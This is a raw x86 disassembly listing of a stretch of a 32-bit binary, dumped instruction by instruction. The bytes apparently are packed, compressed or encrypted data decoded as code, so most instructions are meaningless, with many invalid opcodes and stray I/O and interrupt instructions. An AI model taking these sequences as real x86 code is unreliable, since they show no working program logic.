  401594:	ce                   	into
  401595:	6c                   	insb   (%dx),%es:(%edi)
  401596:	47                   	inc    %edi
  401597:	40                   	inc    %eax
  401598:	5f                   	pop    %edi
  401599:	92                   	xchg   %eax,%edx
  40159a:	81 69 4d 66 5a ac e0 	subl   $0xe0ac5a66,0x4d(%ecx)
  4015a1:	48                   	dec    %eax
  4015a2:	5c                   	pop    %esp
  4015a3:	16                   	push   %ss
  4015a4:	e6 42                	out    %al,$0x42
  4015a6:	07                   	pop    %es
  4015a7:	5c                   	pop    %esp
  4015a8:	0b 6c 5c 70          	or     0x70(%esp,%ebx,2),%ebp
  4015ac:	22 09                	and    (%ecx),%cl
  4015ae:	00 20                	add    %ah,(%eax)
  4015b0:	94                   	xchg   %eax,%esp
  4015b1:	39 0c 04             	cmp    %ecx,(%esp,%eax,1)
  4015b4:	38 e1                	cmp    %ah,%cl
  4015b6:	30 2c 3e             	xor    %ch,(%esi,%edi,1)
  4015b9:	c8 6c f8 6b          	enter  $0xf86c,$0x6b
  4015bd:	10 6d 70             	adc    %ch,0x70(%ebp)
  4015c0:	3c 8f                	cmp    $0x8f,%al
  4015c2:	c3                   	ret
  4015c3:	60                   	pusha
  4015c4:	11 4e 90             	adc    %ecx,-0x70(%esi)
  4015c7:	fa                   	cli
  4015c8:	10 58 6d             	adc    %bl,0x6d(%eax)
  4015cb:	dd 88 cf e1 3c 6c    	fisttpll 0x6c3ce1cf(%eax)
  4015d1:	43                   	inc    %ebx
  4015d2:	1b 80 c7 12 4e 52    	sbb    0x524e12c7(%eax),%eax
  4015d8:	00 45 00             	add    %al,0x0(%ebp)
  4015db:	53                   	push   %ebx
  4015dc:	00 55 00             	add    %dl,0x0(%ebp)
  4015df:	4c                   	dec    %esp
  4015e0:	aa                   	stos   %al,%es:(%edi)
  4015e1:	c5 e6 24             	(bad)
  4015e4:	a8 1b                	test   $0x1b,%al
  4015e6:	18 2f                	sbb    %ch,(%edi)
  4015e8:	44                   	inc    %esp
  4015e9:	2c ba                	sub    $0xba,%al
  4015eb:	b9 ea ff e1 cf       	mov    $0xcfe1ffea,%ecx
  4015f0:	86 27                	xchg   %ah,(%edi)
  4015f2:	01 56 42             	add    %edx,0x42(%esi)
  4015f5:	35 21 f0 1f 2a       	xor    $0x2a1ff021,%eax
  4015fa:	7e 3d                	jle    0x401639
  4015fc:	8b 7f b2             	mov    -0x4e(%edi),%edi
  4015ff:	0a 04 f0             	or     (%eax,%esi,8),%al
  401602:	c6                   	(bad)
  401603:	77 c3                	ja     0x4015c8
  401605:	c8 2a f8 30          	enter  $0xf82a,$0x30
  401609:	b4 35                	mov    $0x35,%ah
  40160b:	46                   	inc    %esi
  40160c:	6c                   	insb   (%dx),%es:(%edi)
  40160d:	6e                   	outsb  %ds:(%esi),(%dx)
  40160e:	0b c7                	or     %edi,%eax
  401610:	e3 00                	jecxz  0x401612
  401612:	04 e9                	add    $0xe9,%al
  401614:	00 c8                	add    %cl,%al
  401616:	24 c4                	and    $0xc4,%al
  401618:	cd f1                	int    $0xf1
  40161a:	9b                   	fwait
  40161b:	04 12                	add    $0x12,%al
  40161d:	16                   	push   %ss
  40161e:	79 0e                	jns    0x40162e
  401620:	8b 7f 84             	mov    -0x7c(%edi),%edi
  401623:	85 b1 66 f0 72 66    	test   %esi,0x6672f066(%ecx)
  401629:	6f                   	outsl  %ds:(%esi),(%dx)
  40162a:	6c                   	insb   (%dx),%es:(%edi)
  40162b:	64 04 6d             	fs add $0x6d,%al
  40162e:	81 35 50 58 21 49 69 	xorl   $0x9996ec69,0x49215850
  401635:	ec 96 99 
  401638:	c7 02 20 3f 8e c7    	movl   $0xc78e3f20,(%edx)
  40163e:	f1                   	int1
  40163f:	28 90 0b 74 23 0c    	sub    %dl,0xc23740b(%eax)
  401645:	e2 b3                	loop   0x4015fa
  401647:	38 16                	cmp    %dl,(%esi)
  401649:	24 cc                	and    $0xcc,%al
  40164b:	44                   	inc    %esp
  40164c:	18 5b 78             	sbb    %bl,0x78(%ebx)
  40164f:	1c 0e                	sbb    $0xe,%al
  401651:	c3                   	ret
  401652:	72 11                	jb     0x401665
  401654:	68 51 14 78 11       	push   $0x11781451
  401659:	19 79 9a             	sbb    %edi,-0x66(%ecx)
  40165c:	e1 20                	loope  0x40167e
  40165e:	4e                   	dec    %esi
  40165f:	eb e2                	jmp    0x401643
  401661:	70 e8                	jo     0x40164b
  401663:	50                   	push   %eax
  401664:	52                   	push   %edx
  401665:	7e 11                	jle    0x401678
  401667:	ac                   	lods   %ds:(%esi),%al
  401668:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401669:	1a 0a                	sbb    (%edx),%cl
  40166b:	8e 08                	mov    (%eax),%cs
  40166d:	52                   	push   %edx
  40166e:	04 68                	add    $0x68,%al
  401670:	ff 34 e6             	push   (%esi,%eiz,8)
  401673:	71 8b                	jno    0x401600
  401675:	fc                   	cld
  401676:	b8 66 48 0e fd       	mov    $0xfd0e4866,%eax
  40167b:	88 35 92 35 c1 b2    	mov    %dh,0xb2c13592
  401681:	00 21                	add    %ah,(%ecx)
  401683:	f5                   	cmc
  401684:	61                   	popa
  401685:	5c                   	pop    %esp
  401686:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
  401688:	7c d0                	jl     0x40165a
  40168a:	24 f6                	and    $0xf6,%al
  40168c:	62 16                	bound  %edx,(%esi)
  40168e:	87 61 a0             	xchg   %esp,-0x60(%ecx)
  401691:	ba ba 43 2d 3f       	mov    $0x3f2d43ba,%edx
  401696:	47                   	inc    %edi
  401697:	ba e5 70 e7 96       	mov    $0x96e770e5,%edx
  40169c:	76 c7                	jbe    0x401665
  40169e:	3d ad 05 3f 8e       	cmp    $0x8e3f05ad,%eax
  4016a3:	e7 79                	out    %eax,$0x79
  4016a5:	b0 ec                	mov    $0xec,%al
  4016a7:	10 64 24 1a          	adc    %ah,0x1a(%esp)
  4016ab:	97                   	xchg   %eax,%edi
  4016ac:	09 31                	or     %esi,(%ecx)
  4016ae:	08 64 96 1e          	or     %ah,0x1e(%esi,%edx,4)
  4016b2:	37                   	aaa
  4016b3:	ff 21                	jmp    *(%ecx)
  4016b5:	1c b4                	sbb    $0xb4,%al
  4016b7:	69 80 68 69 7c 38 1c 	imul   $0x69fcbe1c,0x387c6968(%eax),%eax
  4016be:	be fc 69 
  4016c1:	42                   	inc    %edx
  4016c2:	11 bc 24 c5 e1 70 38 	adc    %edi,0x3870e1c5(%esp)
  4016c9:	a0 23 b0 24 c8       	mov    0xc824b023,%al
  4016ce:	68 fc 54 d6 70       	push   $0x70d654fc
  4016d3:	38 1c a7             	cmp    %bl,(%edi,%eiz,4)
  4016d6:	64 55                	fs push %ebp
  4016d8:	70 5b                	jo     0x401735
  4016da:	8c 55 36             	mov    %ss,0x36(%ebp)
  4016dd:	11 0e                	adc    %ecx,(%esi)
  4016df:	87 c3                	xchg   %eax,%ebx
  4016e1:	e1 38                	loope  0x40171b
  4016e3:	68 e8 99 88 6a       	push   $0x6a8899e8
  4016e8:	00 6b 3e             	add    %ch,0x3e(%ebx)
  4016eb:	66 38 1c a0          	data16 cmp %bl,(%eax,%eiz,4)
  4016ef:	53                   	push   %ebx
  4016f0:	48                   	dec    %eax
  4016f1:	6b 14 69 46          	imul   $0x46,(%ecx,%ebp,2),%edx
  4016f5:	86 32                	xchg   %dh,(%edx)
  4016f7:	2c 8a                	sub    $0x8a,%al
  4016f9:	b0 70                	mov    $0x70,%al
  4016fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4016fc:	ec                   	in     (%dx),%al
  4016fd:	60                   	pusha
  4016fe:	0e                   	push   %cs
  4016ff:	ec                   	in     (%dx),%al
  401700:	19 61 ee             	sbb    %esp,-0x12(%ecx)
  401703:	30 c3                	xor    %al,%bl
  401705:	a0 d6 a1 96 b5       	mov    0xb596a1d6,%al
  40170a:	8e ba 46 b8 73 cb    	mov    -0x348c47ba(%edx),%?
  401710:	55                   	push   %ebp
  401711:	c5 c9 1a             	(bad)
  401714:	50                   	push   %eax
  401715:	51                   	push   %ecx
  401716:	6c                   	insb   (%dx),%es:(%edi)
  401717:	be 31 02 db f8       	mov    $0xf8db0231,%esi
  40171c:	0e                   	push   %cs
  40171d:	55                   	push   %ebp
  40171e:	3e 10 01             	adc    %al,%ds:(%ecx)
  401721:	c0 79 de 53          	sarb   $0x53,-0x22(%ecx)
  401725:	7c 0f                	jl     0x401736
  401727:	40                   	inc    %eax
  401728:	4c                   	dec    %esp
  401729:	50                   	push   %eax
  40172a:	d9 0b                	(bad) (%ebx)
  40172c:	00 e0                	add    %ah,%al
  40172e:	4b                   	dec    %ebx
  40172f:	3b 17                	cmp    (%edi),%edx
  401731:	62 13                	bound  %edx,(%ebx)
  401733:	48                   	dec    %eax
  401734:	df 4a b3             	fisttps -0x4d(%edx)
  401737:	c0 a2 87 ad a1 cc ec 	shlb   $0xec,-0x335e5279(%edx)
  40173e:	cf                   	iret
  40173f:	db 1a                	fistpl (%edx)
  401741:	51                   	push   %ecx
  401742:	03 a2 80 1f cf c4    	add    -0x3b30e080(%edx),%esp
  401748:	c8 b5 9c 3b          	enter  $0x9cb5,$0x3b
  40174c:	68 1c 7f 7e 8f       	push   $0x8f7e7f1c
  401751:	f6 05 60 dc bb 1d 68 	testb  $0x68,0x1dbbdc60
  401758:	b0 2a                	mov    $0x2a,%al
  40175a:	a2 08 07 cf fb       	mov    %al,0xfbcf0708
  40175f:	99                   	cltd
  401760:	a8 09                	test   $0x9,%al
  401762:	b4 00                	mov    $0x0,%ah
  401764:	80 1f c7             	sbbb   $0xc7,(%edi)
  401767:	18 b7 ec a4 b6 46    	sbb    %dh,0x46b6a4ec(%edi)
  40176d:	78 1a                	js     0x401789
  40176f:	33 0a                	xor    (%edx),%ecx
  401771:	4e                   	dec    %esi
  401772:	81 4b 24 27 8d 7f 3f 	orl    $0x3f7f8d27,0x24(%ebx)
  401779:	ef                   	out    %eax,(%dx)
  40177a:	a3 3a 79 1f 0a       	mov    %eax,0xa1f793a
  40177f:	a9 0d 5e 28 1c       	test   $0x1c285e0d,%eax
  401784:	6c                   	insb   (%dx),%es:(%edi)
  401785:	b6 3c                	mov    $0x3c,%dh
  401787:	01 8f 43 37 4c f0    	add    %ecx,-0xfb3c8bd(%edi)
  40178d:	47                   	inc    %edi
  40178e:	38 51 8e             	cmp    %dl,-0x72(%ecx)
  401791:	72 3c                	jb     0x4017cf
  401793:	0e                   	push   %cs
  401794:	e8 26 40 59 44       	call   0x449957bf
  401799:	93                   	xchg   %eax,%ebx
  40179a:	d8 cc                	fmul   %st(4),%st
  40179c:	d4 40                	aam    $0x40
  40179e:	38 7c 4d f1          	cmp    %bh,-0xf(%ebp,%ecx,2)
  4017a2:	c4 7c e4 7c          	les    0x7c(%esp,%eiz,8),%edi
  4017a6:	f8                   	clc
  4017a7:	c6                   	(bad)
  4017a8:	31 9f 53 7c dc 0b    	xor    %ebx,0xbdc7c53(%edi)
  4017ae:	7f 63                	jg     0x401813
  4017b0:	84 98 c5 e1 fe 23    	test   %bl,0x23fee1c5(%eax)
  4017b6:	ac                   	lods   %ds:(%esi),%al
  4017b7:	58                   	pop    %eax
  4017b8:	cc                   	int3
  4017b9:	5b                   	pop    %ebx
  4017ba:	65 1e                	gs push %ds
  4017bc:	f3 3d c3 e1 f0 3a    	repz cmp $0x3af0e1c3,%eax
  4017c2:	30 5e 40             	xor    %bl,0x40(%esi)
  4017c5:	5e                   	pop    %esi
  4017c6:	50                   	push   %eax
  4017c7:	5e                   	pop    %esi
  4017c8:	f3 12 0e             	repz adc (%esi),%cl
  4017cb:	87 60 5e             	xchg   %esp,0x5e(%eax)
  4017ce:	10 7d 6c             	adc    %bh,0x6c(%ebp)
  4017d1:	11 97 a9 87 c3 94    	adc    %edx,-0x6b3c7857(%edi)
  4017d7:	79 30                	jns    0x401809
  4017d9:	7d 6f                	jge    0x40184a
  4017db:	4b                   	dec    %ebx
  4017dc:	38 1c 90             	cmp    %bl,(%eax,%edx,4)
  4017df:	7d 44                	jge    0x401825
  4017e1:	54                   	push   %esp
  4017e2:	88 54 e1 79          	mov    %dl,0x79(%ecx,%eiz,8)
  4017e6:	19 0e                	sbb    %ecx,(%esi)
  4017e8:	68 5b e4 7d 4c       	push   $0x4c7de45b
  4017ed:	53                   	push   %ebx
  4017ee:	1c 0e                	sbb    $0xe,%al
  4017f0:	87 c3                	xchg   %eax,%ebx
  4017f2:	38 27                	cmp    %ah,(%edi)
  4017f4:	b8 52 04 53 dc       	mov    $0xdc530452,%eax
  4017f9:	10 1c cf             	adc    %bl,(%edi,%ecx,8)
  4017fc:	73 58                	jae    0x401856
  4017fe:	e2 e8                	loop   0x4017e8
  401800:	ee                   	out    %al,(%dx)
  401801:	ec                   	in     (%dx),%al
  401802:	7d 7c                	jge    0x401880
  401804:	d3 70 38             	shll   %cl,0x38(%eax)
  401807:	20 27                	and    %ah,(%edi)
  401809:	a8 7e                	test   $0x7e,%al
  40180b:	74 00                	je     0x40180d
  40180d:	b2 d0                	mov    $0xd0,%dl
  40180f:	0c 04                	or     $0x4,%al
  401811:	6e                   	outsb  %ds:(%esi),(%dx)
  401812:	00 67 00             	add    %ah,0x0(%edi)
  401815:	73 00                	jae    0x401817
  401817:	56                   	push   %esi
  401818:	0c e2                	or     $0xe2,%al
  40181a:	ae                   	scas   %es:(%edi),%al
  40181b:	e1 76                	loope  0x401893
  40181d:	00 65 38             	add    %ah,0x38(%ebp)
  401820:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401821:	49                   	dec    %ecx
  401822:	f8                   	clc
  401823:	4d                   	dec    %ebp
  401824:	00 61 c7             	add    %ah,-0x39(%ecx)
  401827:	9c                   	pushf
  401828:	1c 6c                	sbb    $0x6c,%al
  40182a:	b2 6e                	mov    $0x6e,%dl
  40182c:	56                   	push   %esi
  40182d:	e1 fc                	loope  0x40182b
  40182f:	d7                   	xlat   %ds:(%ebx)
  401830:	30 fc                	xor    %bh,%ah
  401832:	c2 bb 6c             	ret    $0x6cbb
  401835:	d8 c3                	fadd   %st(3),%st
  401837:	70 8b                	jo     0x4017c4
  401839:	c3                   	ret
  40183a:	0c c2                	or     $0xc2,%al
  40183c:	ba 4f 21 cf cd       	mov    $0xcdcf214f,%edx
  401841:	2d 87 3d b7 73       	sub    $0x73b73d87,%eax
  401846:	e3 a1                	jecxz  0x4017e9
  401848:	cf                   	iret
  401849:	b1 dc                	mov    $0xdc,%cl
  40184b:	72 f8                	jb     0x401845
  40184d:	8d 8b 5b 0e 0c ad    	lea    -0x52f3f1a5(%ebx),%ecx
  401853:	33 f1                	xor    %ecx,%esi
  401855:	c4 01                	les    (%ecx),%eax
  401857:	1c cf                	sbb    $0xcf,%al
  401859:	e3 d8                	jecxz  0x401833
  40185b:	40                   	inc    %eax
  40185c:	49                   	dec    %ecx
  40185d:	14 04                	adc    $0x4,%al
  40185f:	a8 28                	test   $0x28,%al
  401861:	b7 85                	mov    $0x85,%bh
  401863:	03 7e 3f             	add    0x3f(%esi),%edi
  401866:	8c 01                	mov    %es,(%ecx)
  401868:	0a 04 ac             	or     (%esp,%ebp,4),%al
  40186b:	27                   	daa
  40186c:	28 91 38 9c cf 24    	sub    %dl,0x24cf9c38(%ecx)
  401872:	2d 7f c4 28 d0       	sub    $0xd028c47f,%eax
  401877:	d3 8a c7 51 28 66    	rorl   %cl,0x662851c7(%edx)
  40187d:	b9 61 86 e3 a2       	mov    $0xa2e38661,%ecx
  401882:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  401885:	e1 70                	loope  0x4018f7
  401887:	68 1c 88 5b 90       	push   $0x905b881c
  40188c:	5b                   	pop    %ebx
  40188d:	98                   	cwtl
  40188e:	5b                   	pop    %ebx
  40188f:	1c 0e                	sbb    $0xe,%al
  401891:	87 c3                	xchg   %eax,%ebx
  401893:	c0 5b a8 11          	rcrb   $0x11,-0x58(%ebx)
  401897:	50                   	push   %eax
  401898:	af                   	scas   %es:(%edi),%eax
  401899:	80 73 c5 e1          	xorb   $0xe1,-0x3b(%ebx)
  40189d:	70 38                	jo     0x4018d7
  40189f:	50                   	push   %eax
  4018a0:	5b                   	pop    %ebx
  4018a1:	58                   	pop    %eax
  4018a2:	af                   	scas   %es:(%edi),%eax
  4018a3:	68 af 58 5b ae       	push   $0xae5b58af
  4018a8:	e7 70                	out    %eax,$0x70
  4018aa:	3a b7 74 98 cf f3    	cmp    -0xc30678c(%edi),%dh
  4018b0:	38 9e b8 20 b0 44    	cmp    %bl,0x44b020b8(%esi)
  4018b6:	50                   	push   %eax
  4018b7:	78 1c                	js     0x4018d5
  4018b9:	cf                   	iret
  4018ba:	f3 3c 9c             	repz cmp $0x9c,%al
  4018bd:	ac                   	lods   %ds:(%esi),%al
  4018be:	d0 f0                	shl    $1,%al
  4018c0:	08 b1 38 9e e7 79    	or     %dh,0x79e79e38(%ecx)
  4018c6:	38 78 b0             	cmp    %bh,-0x50(%eax)
  4018c9:	d8 0c b2             	fmuls  (%edx,%esi,4)
  4018cc:	20 f3                	and    %dh,%bl
  4018ce:	3c cf                	cmp    $0xcf,%al
  4018d0:	f3 34 50             	repz xor $0x50,%al
  4018d3:	60                   	pusha
  4018d4:	98                   	cwtl
  4018d5:	c4 e3 71 3c          	(bad)
  4018d9:	cf                   	iret
  4018da:	dc ec                	fsubr  %st,%st(4)
  4018dc:	54                   	push   %esp
  4018dd:	b1 64                	mov    $0x64,%cl
  4018df:	3c b3                	cmp    $0xb3,%al
  4018e1:	87 6c 63 8f          	xchg   %ebp,-0x71(%ebx,%eiz,2)
  4018e5:	6c                   	insb   (%dx),%es:(%edi)
  4018e6:	63 ee                	arpl   %ebp,%esi
  4018e8:	45                   	inc    %ebp
  4018e9:	de fa                	fdivrp %st,%st(2)
  4018eb:	37                   	aaa
  4018ec:	0e                   	push   %cs
  4018ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4018ee:	78 b3                	js     0x4018a3
  4018f0:	b4 08                	mov    $0x8,%ah
  4018f2:	87 e3                	xchg   %esp,%ebx
  4018f4:	71 bc                	jno    0x4018b2
  4018f6:	b3 c8                	mov    $0xc8,%bl
  4018f8:	cc                   	int3
  4018f9:	10 6b 3f             	adc    %ch,0x3f(%ebx)
  4018fc:	11 0e                	adc    %ecx,(%esi)
  4018fe:	ff                   	ljmp   (bad)
  4018ff:	e8 f8 98 74 6e       	call   0x6eb4b1fc
  401904:	9b                   	fwait
  401905:	81 ee 73 cb 0a 76    	sub    $0x760acb73,%esi
  40190b:	9e                   	sahf
  40190c:	5b                   	pop    %ebx
  40190d:	56                   	push   %esi
  40190e:	c0 1d b6 ae 83 b2 67 	rcrb   $0x67,0xb283aeb6
  401915:	21 88 68 71 40 18    	and    %ecx,0x18407168(%eax)
  40191b:	f3 e3 e3             	repz jecxz 0x401901
  40191e:	c7                   	(bad)
  40191f:	c8 70 6c 38          	enter  $0x6c70,$0x38
  401923:	f9                   	stc
  401924:	f9                   	stc
  401925:	f1                   	int1
  401926:	f1                   	int1
  401927:	f0 6f                	lock outsl %ds:(%esi),(%dx)
  401929:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40192a:	5c                   	pop    %esp
  40192b:	28 fc                	sub    %bh,%ah
  40192d:	fc                   	cld
  40192e:	f8                   	clc
  40192f:	f8                   	clc
  401930:	dc 6e 8c             	fsubrl -0x74(%esi)
  401933:	3c ec                	cmp    $0xec,%al
  401935:	3e 7e 7e             	jle,pt 0x4019b6
  401938:	7c 6d                	jl     0x4019a7
  40193a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40193b:	40                   	inc    %eax
  40193c:	f8                   	clc
  40193d:	6c                   	insb   (%dx),%es:(%edi)
  40193e:	1f                   	pop    %ds
  40193f:	3f                   	aas
  401940:	3f                   	aas
  401941:	3f                   	aas
  401942:	b0 5c                	mov    $0x5c,%al
  401944:	24 30                	and    $0x30,%al
  401946:	6b cf cf             	imul   $0xffffffcf,%edi,%ecx
  401949:	8f                   	(bad)
  40194a:	0f e8 6a a4          	psubsb -0x5c(%edx),%mm5
  40194e:	70 2c                	jo     0x40197c
  401950:	e3 e7                	jecxz  0x401939
  401952:	c7 c7 e4 69 9c 48    	mov    $0x489c69e4,%edi
  401958:	fc                   	cld
  401959:	68 cf f3 f3 e3       	push   $0xe3f3f3cf
  40195e:	b0 68                	mov    $0x68,%al
  401960:	20 06                	and    %al,(%esi)
  401962:	df 11                	fists  (%ecx)
  401964:	7e 16                	jle    0x40197c
  401966:	10 5a b8             	adc    %bl,-0x48(%edx)
  401969:	59                   	pop    %ecx
  40196a:	3e 7e 7e             	jle,pt 0x4019eb
  40196d:	dc 28                	fsubrl (%eax)
  40196f:	e4 58                	in     $0x58,%al
  401971:	8f                   	(bad)
  401972:	8f                   	(bad)
  401973:	1f                   	pop    %ds
  401974:	1f                   	pop    %ds
  401975:	58                   	pop    %eax
  401976:	57                   	push   %edi
  401977:	04 a0                	add    $0xa0,%al
  401979:	56                   	push   %esi
  40197a:	50                   	push   %eax
  40197b:	e3 c3                	jecxz  0x401940
  40197d:	c7                   	(bad)
  40197e:	cf                   	iret
  40197f:	08 c4                	or     %al,%ah
  401981:	55                   	push   %ebp
  401982:	70 54                	jo     0x4019d8
  401984:	2c f8                	sub    $0xf8,%al
  401986:	f9                   	stc
  401987:	f1                   	int1
  401988:	f1                   	int1
  401989:	e4 53                	in     $0x53,%al
  40198b:	88 34 ec             	mov    %dh,(%esp,%ebp,8)
  40198e:	52                   	push   %edx
  40198f:	7c fc                	jl     0x40198d
  401991:	fc                   	cld
  401992:	f8                   	clc
  401993:	a0 38 f0 51 3f       	mov    0x3f51f038,%al
  401998:	3e 7e 7e             	jle,pt 0x401a19
  40199b:	ac                   	lods   %ds:(%esi),%al
  40199c:	50                   	push   %eax
  40199d:	80 4f 34 9f          	orb    $0x9f,0x34(%edi)
  4019a1:	9f                   	lahf
  4019a2:	1f                   	pop    %ds
  4019a3:	1f                   	pop    %ds
  4019a4:	e8 4e a4 58 08       	call   0x898bdf7
  4019a9:	4d                   	dec    %ebp
  4019aa:	c3                   	ret
  4019ab:	1c 8e                	sbb    $0x8e,%al
  4019ad:	d0 4d f4             	rorb   $1,-0xc(%ebp)
  4019b0:	01 c3                	add    %eax,%ebx
  4019b2:	bd 27 42 90 84       	mov    $0x84904227,%ebp
  4019b7:	3e c3                	ds ret
  4019b9:	3a 8b dc 26 9f e6    	cmp    -0x1960d924(%ebx),%cl
  4019bf:	c3                   	ret
  4019c0:	54                   	push   %esp
  4019c1:	cc                   	int3
  4019c2:	2a 3c 16             	sub    (%esi,%edx,1),%bh
  4019c5:	34 77                	xor    $0x77,%al
  4019c7:	43                   	inc    %ebx
  4019c8:	00 3a                	add    %bh,(%edx)
  4019ca:	53                   	push   %ebx
  4019cb:	f2 61                	repnz popa
  4019cd:	46                   	inc    %esi
  4019ce:	8b 75 50             	mov    0x50(%ebp),%esi
  4019d1:	34 6d                	xor    $0x6d,%al
  4019d3:	70 77                	jo     0x401a4c
  4019d5:	00 76 8b             	add    %dh,-0x75(%esi)
  4019d8:	72 44                	jb     0x401a1e
  4019da:	33 2e                	xor    (%esi),%ebp
  4019dc:	74 dc                	je     0x4019ba
  4019de:	d2 45 6e             	rolb   %cl,0x6e(%ebp)
  4019e1:	96                   	xchg   %eax,%esi
  4019e2:	15 5c d3 72 00       	adc    $0x72d35c,%eax
  4019e7:	63 26                	arpl   %esp,(%esi)
  4019e9:	93                   	xchg   %eax,%ebx
  4019ea:	bc 16 00 79 45       	mov    $0x45790016,%esp
  4019ef:	5a                   	pop    %edx
  4019f0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4019f1:	37                   	aaa
  4019f2:	58                   	pop    %eax
  4019f3:	6d                   	insl   (%dx),%es:(%edi)
  4019f4:	48                   	dec    %eax
  4019f5:	d9 62 9f             	fldenv -0x61(%edx)
  4019f8:	f6 6f 96             	imulb  -0x6a(%edi)
  4019fb:	c7                   	(bad)
  4019fc:	a2 ba 57 72 66       	mov    %al,0x667257ba
  401a01:	66 b4 ac             	data16 mov $0xac,%ah
  401a04:	2e 62 f5 cd ae 92    	(bad)
  401a0a:	09 f9                	or     %edi,%ecx
  401a0c:	0f 46 e8             	cmovbe %eax,%ebp
  401a0f:	3c ac                	cmp    $0xac,%al
  401a11:	7d 8a                	jge    0x40199d
  401a13:	fe 09                	decb   (%ecx)
  401a15:	fc                   	cld
  401a16:	31 b7 69 24 b9 40    	xor    %esi,0x40b92469(%edi)
  401a1c:	8b e3                	mov    %ebx,%esp
  401a1e:	33 12                	xor    (%edx),%edx
  401a20:	70 20                	jo     0x401a42
  401a22:	91                   	xchg   %eax,%ecx
  401a23:	05 9f 91 38 2e       	add    $0x2e38919f,%eax
  401a28:	08 2e                	or     %ch,(%esi)
  401a2a:	23 2a                	and    (%edx),%ebp
  401a2c:	03 72 c0             	add    -0x40(%edx),%esi
  401a2f:	dc af 1e 00 7c 2d    	fsubrl 0x2d7c001e(%edi)
  401a35:	fc                   	cld
  401a36:	2c 3c                	sub    $0x3c,%al
  401a38:	2d a8 7f 1c 2e       	sub    $0x2e1c7fa8,%eax
  401a3d:	f0 df 3b             	lock fistpll (%ebx)
  401a40:	3e 24 2e             	ds and $0x2e,%al
  401a43:	20 b7 01 79 27 13    	and    %dh,0x13277901(%edi)
  401a49:	4e                   	dec    %esi
  401a4a:	68 c3 be 85 cb       	push   $0xcb85bec3
  401a4f:	24 a1                	and    $0xa1,%al
  401a51:	41                   	inc    %ecx
  401a52:	b4 68                	mov    $0x68,%ah
  401a54:	1c 8f                	sbb    $0x8f,%al
  401a56:	0b 3d 46 9a b7 8f    	or     0x8fb79a46,%edi
  401a5c:	c4 ba 1c 63 34 9e    	les    -0x61cb9ce4(%edx),%edi
  401a62:	f7 c0 cc b3 1a df    	test   $0xdf1ab3cc,%eax
  401a68:	46                   	inc    %esi
  401a69:	e3 48                	jecxz  0x401ab3
  401a6b:	80 5b f9 87          	sbbb   $0x87,-0x7(%ebx)
  401a6f:	f2 3a 71 20          	repnz cmp 0x20(%ecx),%dh
  401a73:	af                   	scas   %es:(%edi),%eax
  401a74:	43                   	inc    %ebx
  401a75:	d7                   	xlat   %ds:(%ebx)
  401a76:	48                   	dec    %eax
  401a77:	cf                   	iret
  401a78:	a3 f4 e8 62 de       	mov    %eax,0xde62e8f4
  401a7d:	97                   	xchg   %eax,%edi
  401a7e:	42                   	inc    %edx
  401a7f:	6c                   	insb   (%dx),%es:(%edi)
  401a80:	b1 5a                	mov    $0x5a,%cl
  401a82:	17                   	pop    %ss
  401a83:	d3 ef                	shr    %cl,%edi
  401a85:	0e                   	push   %cs
  401a86:	87 c3                	xchg   %eax,%ebx
  401a88:	a1 b8 28 fc b3       	mov    0xb3fc28b8,%eax
  401a8d:	dc 28                	fsubrl (%eax)
  401a8f:	54                   	push   %esp
  401a90:	b4 b1                	mov    $0xb1,%ah
  401a92:	70 5c                	jo     0x401af0
  401a94:	27                   	daa
  401a95:	20 68 bc             	and    %ch,-0x44(%eax)
  401a98:	d4 15                	aam    $0x15
  401a9a:	b9 8e 84 c3 7c       	mov    $0x7cc3848e,%ecx
  401a9f:	de 30                	fidivs (%eax)
  401aa1:	d2 3d bc 4e 86 65    	sarb   %cl,0x65864ebc
  401aa7:	b8 7f c9 32 89       	mov    $0x8932c97f,%eax
  401aac:	e0 1f                	loopne 0x401acd
  401aae:	e7 b6                	out    %eax,$0xb6
  401ab0:	19 e7                	sbb    %esp,%edi
  401ab2:	98                   	cwtl
  401ab3:	4d                   	dec    %ebp
  401ab4:	0c 9f                	or     $0x9f,%al
  401ab6:	11 0d 60 68 60 1d    	adc    %ecx,0x1d606860
  401abc:	67 fc                	addr16 cld
  401abe:	3a c3                	cmp    %bl,%al
  401ac0:	0f 2f 8e c3 e2 1c 2f 	comiss 0x2f1ce2c3(%esi),%xmm1
  401ac7:	37                   	aaa
  401ac8:	fb                   	sti
  401ac9:	2e 64 8f             	cs fs (bad)
  401acc:	97                   	xchg   %eax,%edi
  401acd:	19 4b 2f             	sbb    %ecx,0x2f(%ebx)
  401ad0:	24 10                	and    $0x10,%al
  401ad2:	87 43 f7             	xchg   %eax,-0x9(%ebx)
  401ad5:	d2 11                	rclb   %cl,(%ecx)
  401ad7:	d8 11                	fcoms  (%ecx)
  401ad9:	de ac 8b 7b 9a f4 8f 	fisubrs -0x700b6585(%ebx,%ecx,4)
  401ae0:	55                   	push   %ebp
  401ae1:	13 c3                	adc    %ebx,%eax
  401ae3:	b8 34 d9 50 3d       	mov    $0x3d50d934,%eax
  401ae8:	02 66 3d             	add    0x3d(%esi),%ah
  401aeb:	33 c0                	xor    %eax,%eax
  401aed:	ba 68 e4 d1 a6       	mov    $0xa6d1e468,%edx
  401af2:	d3 d1                	rcl    %cl,%ecx
  401af4:	c3                   	ret
  401af5:	b8 a3 d5 74 8b       	mov    $0x8b74d5a3,%eax
  401afa:	47                   	inc    %edi
  401afb:	ae                   	scas   %es:(%edi),%al
  401afc:	f3 54                	repz push %esp
  401afe:	8f                   	(bad)
  401aff:	5c                   	pop    %esp
  401b00:	d3 29                	shrl   %cl,(%ecx)
  401b02:	3e a4                	movsb  %ds:(%esi),%es:(%edi)
  401b04:	f6 53 3b             	notb   0x3b(%ebx)
  401b07:	d6                   	salc
  401b08:	b4 c4                	mov    $0xc4,%ah
  401b0a:	0a 3c ba             	or     (%edx,%edi,4),%bh
  401b0d:	e3 78                	jecxz  0x401b87
  401b0f:	1c 8f                	sbb    $0x8f,%al
  401b11:	a0 fc 90 1b 90       	mov    0x901b90fc,%al
  401b16:	30 30                	xor    %dh,(%eax)
